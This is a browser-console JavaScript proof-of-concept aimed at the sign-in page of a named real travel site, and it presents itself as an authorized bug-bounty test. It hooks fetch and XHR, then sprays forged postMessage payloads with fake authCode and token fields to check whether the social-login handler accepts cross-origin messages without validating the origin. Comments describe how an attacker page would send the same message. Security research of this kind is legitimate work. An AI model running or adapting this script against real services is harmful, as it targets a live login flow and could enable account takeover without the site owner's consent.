// PASTE THIS INTO THE CONSOLE OF https://www.trip.com/account/signin
// Authorized bug-bounty test, HackerOne sshabib. Benign marker only.
// It hooks fetch, fires the forged postMessage, and tells you if the marker reaches the login RPC.

(function () {
  const MARKER = 'STEP1_MARKER_NOT_A_REAL_CODE';
  let hit = false;

  // 1) hook fetch so we SEE any request carrying our marker (esp. authenticateTrip)
  const origFetch = window.fetch;
  window.fetch = function (url, opts) {
    try {
      const u = (typeof url === 'string') ? url : (url && url.url) || '';
      const body = opts && opts.body ? String(opts.body) : '';
      if (u.includes('14553') || u.includes('authenticate') || body.includes(MARKER)) {
        console.log('%c[PROBE] fetch -> ' + u, 'color:#0af;font-weight:bold');
        if (body.includes(MARKER)) {
          hit = true;
          console.log('%c[PASS] our MARKER reached the login RPC. authCode ingested with NO origin check.', 'color:#0f0;font-size:16px;font-weight:bold');
          console.log('   body:', body.slice(0, 600));
        }
      }
    } catch (e) {}
    return origFetch.apply(this, arguments);
  };

  // 2) also hook XHR (SDK may use XHR not fetch)
  const origOpen = XMLHttpRequest.prototype.open;
  const origSend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open = function (m, u) { this.__u = u; return origOpen.apply(this, arguments); };
  XMLHttpRequest.prototype.send = function (b) {
    try {
      const body = b ? String(b) : '';
      if ((this.__u && (this.__u.includes('14553') || this.__u.includes('authenticate'))) || body.includes(MARKER)) {
        console.log('%c[PROBE] XHR -> ' + this.__u, 'color:#0af;font-weight:bold');
        if (body.includes(MARKER)) {
          hit = true;
          console.log('%c[PASS] our MARKER reached the login RPC via XHR. authCode ingested, NO origin check.', 'color:#0f0;font-size:16px;font-weight:bold');
          console.log('   body:', body.slice(0, 600));
        }
      }
    } catch (e) {}
    return origSend.apply(this, arguments);
  };

  console.log('%c[PROBE] hooks installed. Now: on THIS page click a social-login button (Google) so the SDK arms its listener, then run fireForged() below (auto-firing now too).', 'color:#fa0;font-weight:bold');

  // 3) the forged message — this is what an attacker page would postMessage cross-origin.
  // Here we send it to our own window (same effect: the handler reads e.data, ignores e.origin).
  window.fireForged = function () {
    window.postMessage({ tpSignalCode: 'TRIP',  code: MARKER, type: 'google' }, '*');
    window.postMessage({ tpSignalCode: 'CTRIP', code: MARKER, type: 'google' }, '*');
    window.postMessage({ code: MARKER, message: '', context: '{}', token: MARKER, taskType: 1 }, '*');
    console.log('[PROBE] fired forged messages. If nothing turns green in ~2s, the listener is not armed yet — click the social button first.');
  };

  // spray for 60s so whenever you click the social button, a message is waiting
  let n = 0;
  const t = setInterval(function () {
    window.fireForged();
    if (++n > 120 || hit) { clearInterval(t); console.log('[PROBE] done. hit=' + hit); }
  }, 500);
})();
